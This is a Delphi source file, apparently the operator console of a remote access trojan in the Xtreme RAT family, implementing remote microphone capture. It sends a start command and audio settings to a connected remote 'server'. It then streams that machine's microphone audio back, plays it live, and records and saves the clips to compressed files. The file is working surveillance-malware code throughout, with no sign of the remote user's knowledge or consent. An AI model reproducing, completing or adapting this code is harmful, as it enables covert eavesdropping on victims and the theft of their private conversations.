unit UnitAudioCapture;

interface

uses
 StrUtils, Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, ExtCtrls,
  Dialogs, UnitConexao, UnitMain, StdCtrls, Buttons, ComCtrls, Menus, ImgList, ACMOut, ACMConvertor, MMSystem;

type
  TFormAudioCapture = class(TForm)
    ImageList1: TImageList;
    bsSkinPanel1: TPanel;
    AdvListView1: TListView;
    AdvGroupBox1: TGroupBox;
    bsSkinPanel2: TPanel;
    AdvListView2: TListView;
    SpeedButton1: TButton;
    SpeedButton2: TButton;
    SRCheckBox1: TCheckBox;
    SRCheckBox2: TCheckBox;
    StatusBar1: TStatusBar;
    PopupMenu1: TPopupMenu;
    Executar1: TMenuItem;
    Deletar1: TMenuItem;
    N1: TMenuItem;
    Limpar1: TMenuItem;
    N2: TMenuItem;
    Abrir1: TMenuItem;
    Salvar1: TMenuItem;
    OpenDialog1: TOpenDialog;
    SaveDialog1: TSaveDialog;
    procedure FormShow(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure SpeedButton1Click(Sender: TObject);
    procedure SpeedButton2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure PopupMenu1Popup(Sender: TObject);
    procedure Executar1Click(Sender: TObject);
    procedure Deletar1Click(Sender: TObject);
    procedure Limpar1Click(Sender: TObject);
    procedure Salvar1Click(Sender: TObject);
    procedure Abrir1Click(Sender: TObject);
  private
    { Private declarations }
    ACMO: TACMOut;
    ACMC: TACMConvertor;
    Servidor: TConexaoNew;
    ServidorTransferencia: TConexaoNew;
    SelectedOptions: TListItem;
    NomePC: string;
    LiberarForm: boolean;
  	procedure WMCloseFree(var Message: TMessage); message WM_CLOSEFREE;
    procedure AtualizarIdioma;
  	procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
    procedure CreateParams(var Params : TCreateParams); override;
  public
    { Public declarations }
    procedure OnRead(Recebido: String; ConAux: TConexaoNew); overload;
    constructor Create(aOwner: TComponent; ConAux: TConexaoNew); overload;
  end;

var
  FormAudioCapture: TFormAudioCapture;

implementation

{$R *.dfm}

uses
  UnitConstantes,
  UnitStrings,
  CustomIniFiles,
  UnitCompressString,
  UnitCommonProcedures;

//procedure WMAtualizarIdioma(var Message: TMessage); message WM_ATUALIZARIDIOMA;
procedure TFormAudioCapture.WMAtualizarIdioma(var Message: TMessage);
begin
  AtualizarIdioma;
end;  

procedure TFormAudioCapture.WMCloseFree(var Message: TMessage);
begin
  LiberarForm := True;
  Close;
end;

//Here's the implementation of CreateParams
procedure TFormAudioCapture.CreateParams(var Params : TCreateParams);
begin
  inherited CreateParams(Params); //Don't ever forget to do this!!!
  Params.WndParent := GetDesktopWindow;
end;

Procedure CriarArquivo(NomedoArquivo: String; imagem: string; Size: DWORD);
var
  hFile: THandle;
  lpNumberOfBytesWritten: DWORD;
begin
  hFile := CreateFile(PChar(NomedoArquivo), GENERIC_WRITE, FILE_SHARE_WRITE, nil, CREATE_ALWAYS, 0, 0);

  if hFile <> INVALID_HANDLE_VALUE then
  begin
    if Size = INVALID_HANDLE_VALUE then
    SetFilePointer(hFile, 0, nil, FILE_BEGIN);
    WriteFile(hFile, imagem[1], Size, lpNumberOfBytesWritten, nil);
    CloseHandle(hFile);
  end;
end;

type
  TGravacoes = class
    Objeto: string;
  end;

constructor TFormAudioCapture.Create(aOwner: TComponent; ConAux: TConexaoNew);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  inherited Create(aOwner);
  Servidor := ConAux;
  NomePC := Servidor.NomeDoServidor;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  if FileExists(TempStr) = True then
    try
      IniFile := TIniFile.Create(TempStr, IniFilePassword);
      Width := IniFile.ReadInteger('Audio', 'Width', Width);
      Height := IniFile.ReadInteger('Audio', 'Height', Height);
      Left := IniFile.ReadInteger('Audio', 'Left', Left);
      Top := IniFile.ReadInteger('Audio', 'Top', Top);
      IniFile.Free;
    except
      DeleteFile(TempStr);
    end;

end;

procedure TFormAudioCapture.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  TempStr: WideString;
  IniFile: TIniFile;
begin
  if LiberarForm then Action := caFree;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);

  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    IniFile.WriteInteger('Audio', 'Width', Width);
    IniFile.WriteInteger('Audio', 'Height', Height);
    IniFile.WriteInteger('Audio', 'Left', Left);
    IniFile.WriteInteger('Audio', 'Top', Top);
    IniFile.Free;
  except
    DeleteFile(TempStr);
  end;

  if Servidor = nil then exit;
  if Servidor.MasterIdentification <> 1234567890 then Exit;
  if ServidorTransferencia = nil then Exit;
  try
    if ServidorTransferencia.MasterIdentification = 1234567890 then
    try
      ServidorTransferencia.Connection.Disconnect;
	    except
    end;
	except
  end;
end;

procedure TFormAudioCapture.FormShow(Sender: TObject);
begin
  AtualizarIdioma;
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
  SpeedButton1.Visible := True;
  SpeedButton2.Visible := false;
  StatusBar1.Panels.Items[0].Text := '';
  if FormMain.AutoAudio = True then SpeedButton1Click(SpeedButton1);
end;

procedure TFormAudioCapture.Abrir1Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
  MS: TMemoryStream;
  Item: TListItem;
  G: TGravacoes;
  s: string;
begin
  OpenDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  OpenDialog1.InitialDir := ExtractFilePath(Paramstr(0));
  OpenDialog1.FileName := 'XtremeAudioFile.audio';
  OpenDialog1.Filter := 'Xtreme Audio File(*.audio)|*.audio';
  if OpenDialog1.Execute = false then exit;

  AdvListView1.Items.Clear;

  MS := TMemoryStream.Create;
  MS.LoadFromFile(OpenDialog1.FileName);
  MS.Position := 0;
  SetLength(TempStr, MS.Size div 2);
  MS.Read(TempStr[1], MS.Size);
  MS.Free;

  TempStr := DecompressString(TempStr);
  while posex(DelimitadorComandos, TempStr) > 0 do
  begin
    Item := AdvListView1.Items.Add;
    Item.ImageIndex := 75;

    s := Copy(TempStr, 1, posex('|', TempStr) - 1);
    delete(TempStr, 1, posex('|', TempStr));
    Item.Caption := s;

    s := Copy(TempStr, 1, posex('|', TempStr) - 1);
    delete(TempStr, 1, posex('|', TempStr));
    Item.SubItems.Add(s);

    s := Copy(TempStr, 1, posex('|', TempStr) - 1);
    delete(TempStr, 1, posex('|', TempStr));
    G := TGravacoes.Create;
    G.Objeto := Copy(TempStr, 1, posex(DelimitadorComandos, TempStr) - 1);
    delete(TempStr, 1, posex(DelimitadorComandos, TempStr) - 1);
    delete(TempStr, 1, Length(DelimitadorComandos));

    Item.SubItems.AddObject(s, TObject(G));
  end;
end;

procedure TFormAudioCapture.AtualizarIdioma;
begin
  AdvListView1.Column[0].Caption := traduzidos[481];
  AdvListView1.Column[1].Caption := traduzidos[482];
  AdvListView1.Column[2].Caption := traduzidos[483];

  AdvListView2.Column[0].Caption := traduzidos[484];
  AdvListView2.Column[1].Caption := traduzidos[485];

  SRCheckBox1.Caption := traduzidos[486];
  SRCheckBox2.Caption := traduzidos[487];

  AdvGroupBox1.Caption := traduzidos[488];
  Limpar1.Caption := traduzidos[489];

  SpeedButton1.Caption := traduzidos[256];
  SpeedButton2.Caption := traduzidos[257];

  Executar1.Caption := traduzidos[315];
  Deletar1.Caption := traduzidos[312];

  Abrir1.Caption := traduzidos[460];
  Salvar1.Caption := traduzidos[590];
end;

function ShowTime(DayChar: Char = '/'; DivChar: Char = ' ';
  HourChar: Char = ':'): String;
var
  SysTime: TSystemTime;
  Month, Day, Hour, Minute, Second: String;
begin
  GetSystemTime(SysTime);
  Month := inttostr(SysTime.wMonth);
  Day := inttostr(SysTime.wDay);
  Hour := inttostr(SysTime.wHour + 1);
  Minute := inttostr(SysTime.wMinute);
  Second := inttostr(SysTime.wSecond);
  if length(Month) = 1 then
    Month := '0' + Month;
  if length(Day) = 1 then
    Day := '0' + Day;
  if length(Hour) = 1 then
    Hour := '0' + Hour;
  if Hour = '24' then
    Hour := '00';
  if length(Minute) = 1 then
    Minute := '0' + Minute;
  if length(Second) = 1 then
    Second := '0' + Second;
  Result := Day + DayChar + Month + DayChar + inttostr(SysTime.wYear)
    + DivChar + Hour + HourChar + Minute + HourChar + Second;
end;

procedure TFormAudioCapture.OnRead(Recebido: string; ConAux: TConexaoNew);
var
  TempInt: Int64;
  Item: TListItem;
  TempStr: string;
  i: integer;
  Result: TSplit;
  Gravacoes: TGravacoes;
  Format: TWaveFormatEx;
begin
  if Copy(Recebido, 1, posex('|', Recebido) - 1) = AUDIOSTREAM then
  begin
    delete(Recebido, 1, posex('|', Recebido));

    if SRCheckBox1.Checked then
      ACMO.Play(pointer(Recebido)^, length(Recebido) * 2);

    if SRCheckBox2.Checked then
    begin
      Gravacoes := TGravacoes.Create;
      Gravacoes.Objeto := Recebido;
      Item := AdvListView1.Items.Add;
      Item.ImageIndex := 75;
      Item.Caption := inttostr(AdvListView1.Items.Count);
      Item.SubItems.Add(FileSizeToStr(length(Recebido)));
      Item.SubItems.AddObject(timetostr(time), TObject(Gravacoes));
    end;
  end else

  if Copy(Recebido, 1, posex('|', Recebido) - 1) = STARTAUDIO then
  begin
    ServidorTransferencia := ConAux;

    if not assigned(SelectedOptions) then
    begin
      AdvListView2.Items[9].Selected := True;
      SelectedOptions := AdvListView2.Selected;
    end;

    if AdvListView1.Items.Count > 0 then
      AdvListView1.Items.Clear;

    if SelectedOptions.SubItems[0] = 'Stereo' then
      Format.nChannels := 2
    else
      Format.nChannels := 1;

    Format.nSamplesPerSec := StrToInt(SelectedOptions.Caption);

    Format.wBitsPerSample := 16;
    Format.nAvgBytesPerSec := Format.nSamplesPerSec * Format.nChannels * 2;
    Format.nBlockAlign := Format.nChannels * 2;

    ACMC.FormatIn.Format.nChannels := Format.nChannels;
    ACMC.FormatIn.Format.nSamplesPerSec := Format.nSamplesPerSec;
    ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
    ACMC.FormatIn.Format.nBlockAlign := Format.nBlockAlign;
    ACMC.FormatIn.Format.wBitsPerSample := Format.wBitsPerSample;

    SetLength(TempStr, SizeOf(TWaveFormatEx) div 2);
    Move(Format, TempStr[1], SizeOf(TWaveFormatEx));

    ServidorTransferencia.EnviarString(AUDIOSETTINGS + '|' + TempStr);
    StatusBar1.Panels.Items[0].Text := traduzidos[373];
  end
  else

end;

procedure TFormAudioCapture.PopupMenu1Popup(Sender: TObject);
var
  i: integer;
begin
  for i := 0 to PopupMenu1.Items.Count - 1 do
    PopupMenu1.Items.Items[i].Enabled := false;
  Limpar1.Enabled := True;
  Abrir1.Enabled := True;
  if AdvListView1.Selected = nil then
    exit
  else
    for i := 0 to PopupMenu1.Items.Count - 1 do
      PopupMenu1.Items.Items[i].Enabled := True;
end;

procedure TFormAudioCapture.Salvar1Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
begin
  SaveDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  SaveDialog1.InitialDir := ExtractFilePath(Paramstr(0));
  SaveDialog1.FileName := 'XtremeAudioFile.audio';
  SaveDialog1.Filter := 'Xtreme Audio File(*.audio)|*.audio';
  if SaveDialog1.Execute = false then exit;

  TempStr := '';
  for I := 0 to AdvListView1.Items.Count - 1 do if AdvListView1.Items.Item[i].Selected then
  begin
    TempStr := TempStr + AdvListView1.Items.Item[i].Caption + '|' +
                         AdvListView1.Items.Item[i].SubItems.Strings[0] + '|' +
                         AdvListView1.Items.Item[i].SubItems.Strings[1] + '|' +
                         TGravacoes(AdvListView1.Items[i].SubItems.Objects[1]).Objeto +
                         DelimitadorComandos;
  end;
  TempStr := CompressString(TempStr);
  CriarArquivo(SaveDialog1.FileName, TempStr, Length(TempStr) * 2);
end;

procedure TFormAudioCapture.SpeedButton1Click(Sender: TObject);
begin
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;

  if ServidorTransferencia <> nil then
  try
    if ServidorTransferencia.MasterIdentification = 1234567890 then
    try
      ServidorTransferencia.Connection.Disconnect;
	  except
    end;	
	except
  end; 	

  // será o único caso de usar o "Servidor" e não "ServidorTranferencia", porque ainda estará "nil"
  if AdvListView2.Selected = nil then AdvListView2.Items.Item[9].Selected := True;
  SelectedOptions := AdvListView2.Selected;
  Servidor.EnviarString(STARTAUDIO + '|');
  SpeedButton1.Visible := false;
  SpeedButton2.Visible := True;
  StatusBar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormAudioCapture.SpeedButton2Click(Sender: TObject);
begin
  if ServidorTransferencia = nil then Exit;
  try
    if ServidorTransferencia.MasterIdentification = 1234567890 then
    try
      ServidorTransferencia.Connection.Disconnect;
      except
    end;	
	except
  end;

  SpeedButton1.Visible := True;
  SpeedButton2.Visible := false;
end;

procedure TFormAudioCapture.FormCreate(Sender: TObject);
begin
  Self.Left := (screen.width - Self.width) div 2 ;
  Self.top := (screen.height - Self.height) div 2;
  ACMO := TACMOut.Create(nil);
  ACMC := TACMConvertor.Create;
  ACMO.NumBuffers := 0;
  ACMO.Open(ACMC.FormatIn);
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
end;

procedure TFormAudioCapture.Deletar1Click(Sender: TObject);
var
  i: integer;
begin
  for i := AdvListView1.Items.Count - 1 downto 0 do
    if AdvListView1.Items.Item[i].Selected = True then
      AdvListView1.Items.Item[i].delete;
end;

procedure TFormAudioCapture.Executar1Click(Sender: TObject);
var
  i: integer;
  Gravacoes: TGravacoes;
  Recebido: string;
begin
  for i := 0 to AdvListView1.Items.Count - 1 do
  begin
    application.ProcessMessages;
    if AdvListView1.Items[i].Selected = True then
    begin
      Gravacoes := TGravacoes(AdvListView1.Items[i].SubItems.Objects[1]);
      Recebido := Gravacoes.Objeto;
      ACMO.Play(pointer(Recebido)^, length(Recebido) * 2);
    end;
  end;
end;

procedure TFormAudioCapture.Limpar1Click(Sender: TObject);
begin
  if AdvListView1.Items.Count > 0 then AdvListView1.Items.Clear;
end;

end.
